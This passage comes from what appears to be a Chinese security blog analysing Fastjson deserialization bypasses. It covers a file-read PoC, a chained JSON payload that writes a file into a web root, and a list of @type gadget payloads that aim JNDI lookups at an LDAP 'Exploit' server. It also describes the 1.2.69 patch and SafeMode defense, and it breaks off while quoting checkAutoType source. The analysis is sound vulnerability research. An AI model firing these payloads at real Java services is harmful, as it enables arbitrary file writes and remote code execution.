class="keyword">finally</span> &#123;</span><br><span class="line">                    FileUtil.safeClose(source);</span><br><span class="line">                    FileUtil.safeClose(destination);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">createTempFile</span><span class="params">(String tempPath)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (tempPath == <span class="literal">null</span>) &#123;</span><br><span class="line">            tempPath = <span class="built_in">this</span>.target.getAbsolutePath() + <span class="string">&quot;.bak&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.temp = <span class="keyword">new</span> <span class="title class_">File</span>(tempPath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.output.flush();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            <span class="type">IOException</span> <span class="variable">e</span> <span class="operator">=</span> var2;</span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTempFilePath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.temp.getAbsolutePath();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">transferStreams</span><span class="params">(InputStream source, OutputStream destination)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> source.read(buffer);</span><br><span class="line">            <span class="keyword">if</span> (bytesRead == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            destination.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> b)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.output.write(b);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var3) &#123;</span><br><span class="line">            <span class="type">IOException</span> <span class="variable">e</span> <span class="operator">=</span> var3;</span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据原理来写一个POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\&quot;tempPath\&quot;:\&quot;C://windows/win.ini\&quot;,\&quot;targetPath\&quot;:\&quot;E:/flag.txt\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到成功读取文件内容并写入flag.txt</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742203598002-8b8b4abc-dd9c-433b-8689-da68f41ed4ae.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742203598002-8b8b4abc-dd9c-433b-8689-da68f41ed4ae.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="CdujD">写入文件</h4>
利用类：com.esotericsoftware.kryo.io.Output

<p>依赖：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;kryo&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>该类写入了提供了<code>setOutputStream</code>和<code>setBuffer</code>两个setter方法用来写入输入流，其中的buffer参数值是文件内容，outputStream参数值就是前面的SafeFileOutputStream类对象，而要触发写文件操作则需要调用其<code>flush()</code>方法，该方法将流写入一个文件内</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** Sets a new OutputStream. The position and total are reset, discarding any buffered bytes.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> outputStream May be null. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setOutputStream</span> <span class="params">(OutputStream outputStream)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.outputStream = outputStream;</span><br><span class="line">    position = <span class="number">0</span>;</span><br><span class="line">    total = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** Sets the buffer that will be written to. &#123;<span class="doctag">@link</span> #setBuffer(byte[], int)&#125; is called with the specified buffer&#x27;s length as the</span></span><br><span class="line"><span class="comment"> * maxBufferSize. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBuffer</span> <span class="params">(<span class="type">byte</span>[] buffer)</span> &#123;</span><br><span class="line">    setBuffer(buffer, buffer.length);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** Writes the buffered bytes to the underlying OutputStream, if any. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span> <span class="params">()</span> <span class="keyword">throws</span> KryoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (outputStream == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        outputStream.write(buffer, <span class="number">0</span>, position);</span><br><span class="line">        outputStream.flush();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">KryoException</span>(ex);</span><br><span class="line">    &#125;</span><br><span class="line">    total += position;</span><br><span class="line">    position = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>写入文件时，我们就可以考虑写入恶意文件</p>
<p>接下来我们就看，怎么样去触发这个<code>flush</code>函数了，通过查找用法查看，只有在<code>close()</code>和<code>require()</code>函数被调用时才会触发，其中<code>require</code>只有在调用write相关函数时才会被触发，存在着链子的思维</p>
<p>我们找到<code>ObjectOutputStream</code>类，其中它的内部类<code>BlockDataOutputStream</code>的构造函数，将<code>OutputStream</code>类型参数赋值给了out成员变量，而其中的<code>setBolockDataMode</code>函数调用了<code>drain</code>方法，<code>drain</code>中又调用了<code>out.write</code>方法，从而调用了<code>flush</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Creates new BlockDataOutputStream on top of given underlying stream.  </span></span><br><span class="line"><span class="comment"> * Block data mode is turned off by default.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> BlockDataOutputStream(OutputStream out) &#123;  </span><br><span class="line"> <span class="built_in">this</span>.out = out;  </span><br><span class="line"> dout = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(<span class="built_in">this</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Sets block data mode to the given mode (true == on, false == off)  </span></span><br><span class="line"><span class="comment"> * and returns the previous mode value.  If the new mode is the same as  </span></span><br><span class="line"><span class="comment"> * the old mode, no action is taken.  If the new mode differs from the  </span></span><br><span class="line"><span class="comment"> * old mode, any buffered data is flushed before switching to the new  </span></span><br><span class="line"><span class="comment"> * mode.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="type">boolean</span> <span class="title function_">setBlockDataMode</span><span class="params">(<span class="type">boolean</span> mode)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line"> <span class="keyword">if</span> (blkmode == mode) &#123;  </span><br><span class="line"> <span class="keyword">return</span> blkmode;  </span><br><span class="line"> &#125;  </span><br><span class="line"> drain();  </span><br><span class="line"> blkmode = mode;  </span><br><span class="line"> <span class="keyword">return</span> !blkmode;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">...  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Writes all buffered data from this stream to the underlying stream,  </span></span><br><span class="line"><span class="comment"> * but does not flush underlying stream.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="keyword">void</span> <span class="title function_">drain</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line"> <span class="keyword">if</span> (pos == <span class="number">0</span>) &#123;  </span><br><span class="line"> <span class="keyword">return</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line"> <span class="keyword">if</span> (blkmode) &#123;  </span><br><span class="line"> writeBlockHeader(pos);  </span><br><span class="line"> &#125;  </span><br><span class="line"> out.write(buf, <span class="number">0</span>, pos);  </span><br><span class="line"> pos = <span class="number">0</span>;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>对于<code>setBlockDataMode</code>函数的调用，在<code>ObjectOutputStream</code>类的有参构造函数中就存在：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">     verifySubclass();  </span><br><span class="line">     bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out);  </span><br><span class="line">     handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);  </span><br><span class="line">     subs = <span class="keyword">new</span> <span class="title class_">ReplaceTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);  </span><br><span class="line">     enableOverride = <span class="literal">false</span>;  </span><br><span class="line">     writeStreamHeader();  </span><br><span class="line">     bout.setBlockDataMode(<span class="literal">true</span>);  </span><br><span class="line">     <span class="keyword">if</span> (extendedDebugInfo) &#123;  </span><br><span class="line">         debugInfoStack = <span class="keyword">new</span> <span class="title class_">DebugTraceInfoStack</span>();  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">     debugInfoStack = <span class="literal">null</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是Fastjson优先获取ObjectOutputStream类的无参构造方法，只能找它的继承类来触发了</p>
<p>我们找到一个只有有参构造方法的类：<code>com.sleepycat.bind.serial.SerialOutput</code></p>
<p>依赖：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;com.sleepycat&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;je&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">5.0</span><span class="number">.73</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以看到，它的有参构造方法，是使用了他父类<code>ObjectOutputStream</code>的有参构造方法，这就满足我们之前的要求了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SerialOutput</span><span class="params">(OutputStream out, ClassCatalog classCatalog)</span>  </span><br><span class="line"> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">  </span><br><span class="line"> <span class="built_in">super</span>(out);  </span><br><span class="line"> <span class="built_in">this</span>.classCatalog = classCatalog;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/* guarantee that we&#x27;ll always use the same serialization format */</span>  </span><br><span class="line">  </span><br><span class="line"> useProtocolVersion(ObjectStreamConstants.PROTOCOL_VERSION_2);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>POC如下，用到了Fastjson循环引用的技巧来调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;stream&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;targetPath&quot;</span>: <span class="string">&quot;D:/wamp64/www/hacked.txt&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tempPath&quot;</span>: <span class="string">&quot;D:/wamp64/www/test.txt&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;writer&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span>,</span><br><span class="line">        <span class="string">&quot;buffer&quot;</span>: <span class="string">&quot;cHduZWQ=&quot;</span>,</span><br><span class="line">        <span class="string">&quot;outputStream&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;$ref&quot;</span>: <span class="string">&quot;$.stream&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;position&quot;</span>: <span class="number">5</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;close&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span>,</span><br><span class="line">        <span class="string">&quot;out&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;$ref&quot;</span>: <span class="string">&quot;$.writer&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ZV6G8">补丁修复</h3>
在GitHub官方的diff，主要在ParserConfig.java中：

<p><a href="https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4">https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4</a></p>
<p>在expectClass的对比逻辑中，对类名进行了hash处理在比较hash黑名单，并添加了几个类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742225722469-b1709e8b-66f9-4c87-ad97-444f38b9a26b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742225722469-b1709e8b-66f9-4c87-ad97-444f38b9a26b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>有人通过彩虹表碰撞，知道了其中新添加的三个类为如下</p>
<table>
<thead>
<tr>
<th><strong><font style="color:rgb(80, 80, 92);">版本</font></strong></th>
<th><strong><font style="color:rgb(80, 80, 92);">十进制Hash值</font></strong></th>
<th><strong><font style="color:rgb(80, 80, 92);">十六进制Hash值</font></strong></th>
<th><strong><font style="color:rgb(80, 80, 92);">类名</font></strong></th>
</tr>
</thead>
<tbody><tr>
<td><font style="color:rgb(80, 80, 92);">1.2.69</font></td>
<td><font style="color:rgb(80, 80, 92);">5183404141909004468L</font></td>
<td><font style="color:rgb(80, 80, 92);">0x47ef269aadc650b4L</font></td>
<td><font style="color:rgb(80, 80, 92);">java.lang.Runnable</font></td>
</tr>
<tr>
<td><font style="color:rgb(80, 80, 92);">1.2.69</font></td>
<td><font style="color:rgb(80, 80, 92);">2980334044947851925L</font></td>
<td><font style="color:rgb(80, 80, 92);">0x295c4605fd1eaa95L</font></td>
<td><font style="color:rgb(80, 80, 92);">java.lang.Readable</font></td>
</tr>
<tr>
<td><font style="color:rgb(80, 80, 92);">1.2.69</font></td>
<td><font style="color:rgb(80, 80, 92);">-1368967840069965882L</font></td>
<td><font style="color:rgb(80, 80, 92);">0xed007300a7b227c6L</font></td>
<td><font style="color:rgb(80, 80, 92);">java.lang.AutoCloseable</font></td>
</tr>
</tbody></table>
<h3 id="paOC8">SafeMode</h3>
官方的参考：[https://github.com/alibaba/fastjson/wiki/fastjson_safemode](https://github.com/alibaba/fastjson/wiki/fastjson_safemode)

<p>在1.2.68之后的版本中，fastjson添加了safeMode的支持</p>
<p>该参数开启后，完全禁用autoType。所有安全修复版本sec10也支持safeMode配置</p>
<p>代码中开启SafeMode代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setSafeMode(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>开启之后，就完全禁用<code>AutoType</code>即<code>@type</code>了，这样就能防御住Fastjson反序列化漏洞了。具体的处理逻辑，是放在<code>checkAutoType()</code>函数中的前面，获取是否设置了<code>SafeMode</code>，如果是则直接抛出异常终止运行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742226095954-8dcd4d63-c233-44da-8255-69038f77625e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742226095954-8dcd4d63-c233-44da-8255-69038f77625e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="i8Gz2">其他一些绕过黑名单的Gadget</h2>
<h3 id="Ez1g2">1.2.59</h3>
com.zaxxer.hikari.HikariConfig类PoC：

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;或&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="g66pt">1.2.61</h3>
org.apache.commons.proxy.provider.remoting.SessionBeanProvider类PoC：

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span>,<span class="string">&quot;jndiName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="string">&quot;Object&quot;</span>:<span class="string">&quot;a&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="S7C1P">1.2.62</h3>
<font style="color:rgb(80, 80, 92);">org.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC：</font>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span>, <span class="string">&quot;parameters&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Hashtable&quot;</span>,<span class="string">&quot;java.naming.factory.initial&quot;</span>:<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>,<span class="string">&quot;topic-factory&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;, <span class="string">&quot;namespace&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="MbKCt">1.2.68</h3>
<font style="color:rgb(80, 80, 92);">org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC：</font>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;或&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(80, 80, 92);">com.caucho.config.types.ResourceRef类PoC：</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.caucho.config.types.ResourceRef&quot;</span>,<span class="string">&quot;lookupName&quot;</span>: <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;value&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.value&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="未知版本">未知版本</h3>
org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC：

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;</span>, <span class="string">&quot;tmJndiName&quot;</span>: <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;tmFromJndi&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;transactionManager&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.transactionManager&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(80, 80, 92);">org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory类PoC：</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;</span>, <span class="string">&quot;tmJndiName&quot;</span>: <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;tmFromJndi&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;transactionManager&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.transactionManager&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson各版本绕过分析</title>
    <url>/2025/03/13/FastJson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="bxzet">FastJson各版本绕过分析</h1>

<p>这篇主要是讲一下Fastjson中版本&gt;&#x3D;<font style="color:rgb(80, 80, 92);">1.2.25后补丁的绕过方式 </font></p>
<p><strong>tips: 都必须开启AutoTypeSupport才能成功</strong></p>
<h2 id="EeGoD">漏洞修复</h2>
想要绕过后续版本，我们就一定要知道哪里做了修改

<p>修补方案就是将<code>DefaultJSONParser.parseObject()</code>函数中的<code>TypeUtils.loadClass</code>替换为<code>checkAutoType()</code>函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741785104503-26d3ec85-4155-45e2-881d-9631568066ce.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741785104503-26d3ec85-4155-45e2-881d-9631568066ce.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="McNzR">checkAutoType()函数</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// autoTypeSupport默认为False</span></span><br><span class="line">    <span class="comment">// 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 从Map缓存中获取类，注意这是后面版本的漏洞点</span></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"> </span><br><span class="line">                <span 